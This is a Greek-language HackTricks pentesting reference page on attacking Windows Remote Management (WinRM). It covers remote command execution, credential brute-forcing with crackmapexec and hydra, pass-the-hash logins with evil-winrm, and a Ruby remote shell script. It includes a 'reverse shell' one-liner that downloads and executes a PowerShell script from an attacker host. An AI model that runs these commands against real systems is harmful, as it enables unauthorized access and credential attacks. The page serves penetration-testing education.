# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>) επισημαίνεται ως ένα ** πρωτόκολλο από τη Microsoft** που επιτρέπει τη **τηλεδιαχείριση συστημάτων Windows** μέσω HTTP(S), αξιοποιώντας το SOAP στη διαδικασία. Βασίζεται θεμελιωδώς στο WMI, παρουσιάζοντας τον εαυτό του ως μια διεπαφή βασισμένη σε HTTP για τις λειτουργίες WMI.

Η παρουσία του WinRM σε μια μηχανή επιτρέπει την απλή απομακρυσμένη διαχείριση μέσω PowerShell, παρόμοια με το πώς λειτουργεί το SSH για άλλα λειτουργικά συστήματα. Για να προσδιορίσετε αν το WinRM είναι λειτουργικό, συνιστάται να ελέγξετε το άνοιγμα συγκεκριμένων θυρών:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

Μια ανοιχτή θύρα από τη λίστα παραπάνω σημαίνει ότι το WinRM έχει ρυθμιστεί, επιτρέποντας έτσι τις προσπάθειες έναρξης μιας απομακρυσμένης συνεδρίας.

### **Έναρξη μιας Συνεδρίας WinRM**

Για να ρυθμίσετε το PowerShell για το WinRM, το cmdlet `Enable-PSRemoting` της Microsoft έρχεται στο προσκήνιο, ρυθμίζοντας τον υπολογιστή να δέχεται απομακρυσμένες εντολές PowerShell. Με ανυψωμένη πρόσβαση PowerShell, οι παρακάτω εντολές μπορούν να εκτελούνται για να ενεργοποιήσουν αυτή τη λειτουργικότητα και να ορίσουν οποιονδήποτε υπολογιστή ως αξιόπιστο:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Αυτή η προσέγγιση περιλαμβάνει την προσθήκη ενός wildcard στη ρύθμιση `trustedhosts`, ένα βήμα που απαιτεί προσεκτική εξέταση λόγω των επιπτώσεών του. Επίσης, σημειώνεται ότι η αλλαγή του τύπου δικτύου από "Public" σε "Work" μπορεί να είναι απαραίτητη στη μηχανή του επιτιθέμενου.

Επιπλέον, το WinRM μπορεί να **ενεργοποιηθεί απομακρυσμένα** χρησιμοποιώντας την εντολή `wmic`, όπως φαίνεται παρακάτω:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Αυτή η μέθοδος επιτρέπει την απομακρυσμένη ρύθμιση του WinRM, ενισχύοντας την ευελιξία στη διαχείριση των Windows μηχανών από μακριά.

### Δοκιμάστε αν είναι ρυθμισμένο

Για να επαληθεύσετε τη ρύθμιση της μηχανής επίθεσης σας, χρησιμοποιείται η εντολή `Test-WSMan` για να ελέγξετε αν ο στόχος έχει ρυθμισμένο σωστά το WinRM. Εκτελώντας αυτή την εντολή, θα πρέπει να περιμένετε να λάβετε λεπτομέρειες σχετικά με την έκδοση του πρωτοκόλλου και το wsmid, υποδεικνύοντας επιτυχημένη ρύθμιση. Παρακάτω παρατίθενται παραδείγματα που δείχνουν την αναμενόμενη έξοδο για έναν ρυθμισμένο στόχο σε σύγκριση με έναν μη ρυθμισμένο:

- Για έναν στόχο που **είναι** σωστά ρυθμισμένος, η έξοδος θα μοιάζει με αυτό:
```bash
Test-WSMan <target-ip>
```
Η απάντηση θα πρέπει να περιέχει πληροφορίες σχετικά με την έκδοση του πρωτοκόλλου και το wsmid, υποδηλώνοντας ότι το WinRM έχει ρυθμιστεί σωστά.

![](<../images/image (582).png>)

- Αντίθετα, για έναν στόχο **μη** ρυθμισμένο για WinRM, αυτό θα είχε ως αποτέλεσμα να μην υπάρχουν τέτοιες λεπτομερείς πληροφορίες, επισημαίνοντας την απουσία σωστής ρύθμισης του WinRM.

![](<../images/image (458).png>)

### Εκτέλεση εντολής

Για να εκτελέσετε το `ipconfig` απομακρυσμένα σε μια μηχανή στόχο και να δείτε την έξοδό του, κάντε:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

Μπορείτε επίσης να **εκτελέσετε μια εντολή της τρέχουσας κονσόλας PS σας μέσω** _**Invoke-Command**_. Υποθέστε ότι έχετε τοπικά μια συνάρτηση που ονομάζεται _**enumeration**_ και θέλετε να **την εκτελέσετε σε έναν απομακρυσμένο υπολογιστή**, μπορείτε να κάνετε:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Εκτέλεση ενός Σεναρίου
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Πάρε reverse-shell
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Αποκτήστε μια συνεδρία PS

Για να αποκτήσετε μια διαδραστική κονσόλα PowerShell, χρησιμοποιήστε `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**Η συνεδρία θα εκτελείται σε μια νέα διαδικασία (wsmprovhost) μέσα στον "θύμα"**

### **Αναγκάζοντας το WinRM να ανοιχτεί**

Για να χρησιμοποιήσετε το PS Remoting και το WinRM αλλά ο υπολογιστής δεν είναι ρυθμισμένος, μπορείτε να το ενεργοποιήσετε με:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Αποθήκευση και Επαναφορά συνεδριών

Αυτό **δεν θα λειτουργήσει** αν η **γλώσσα** είναι **περιορισμένη** στον απομακρυσμένο υπολογιστή.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Μέσα σε αυτές τις συνεδρίες μπορείτε να φορτώσετε PS scripts χρησιμοποιώντας _Invoke-Command_
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Σφάλματα

Αν βρείτε το παρακάτω σφάλμα:

`enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.`

Η δοκιμή στον πελάτη (πληροφορίες από [εδώ](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## WinRM σύνδεση σε linux

### Brute Force

Προσοχή, η βίαιη προσπάθεια σύνδεσης στο winrm μπορεί να αποκλείσει χρήστες.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Χρησιμοποιώντας το evil-winrm
```ruby
gem install evil-winrm
```
Διαβάστε **τεκμηρίωση** στο github του: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Για να χρησιμοποιήσετε το evil-winrm για να συνδεθείτε σε μια **διεύθυνση IPv6**, δημιουργήστε μια καταχώρηση μέσα στο _**/etc/hosts**_ ορίζοντας ένα **όνομα τομέα** στη διεύθυνση IPv6 και συνδεθείτε σε αυτόν τον τομέα.

### Περάστε το hash με το evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### Χρησιμοποιώντας μια μηχανή PS-docker
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Χρησιμοποιώντας ένα σενάριο ruby

**Κώδικας που εξάγεται από εδώ:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

## Αναφορές

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Αυτόματες Εντολές
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
​

{{#include ../banners/hacktricks-training.md}}
